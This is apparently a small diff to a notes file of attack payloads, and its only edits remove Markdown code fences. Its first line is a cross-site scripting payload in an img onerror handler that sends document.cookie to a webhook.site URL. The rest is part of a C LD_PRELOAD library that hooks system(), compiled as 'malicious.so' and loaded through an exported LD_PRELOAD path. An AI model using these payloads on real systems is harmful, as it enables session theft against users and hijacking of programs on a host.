@@ -1,5 +1,5 @@
 <img src="x" onerror="if (!window.spammed) { window.spammed = true; this.src='https://webhook.site/b289fee0-0412-4cbb-9a24-5658f3066af3/?' + document.cookie; }">
-```
+
 #define _GNU_SOURCE
 #include <dlfcn.h>
 #include <stdio.h>
@@ -16,7 +16,7 @@ int system(const char *command) {
     orig_system original_system = dlsym(RTLD_NEXT, "system");
     return original_system(command);
 }
-```
+
 gcc -shared -fPIC -o malicious.so malicious.c -ldl
 
 export LD_PRELOAD=~/path_to_malicious.so
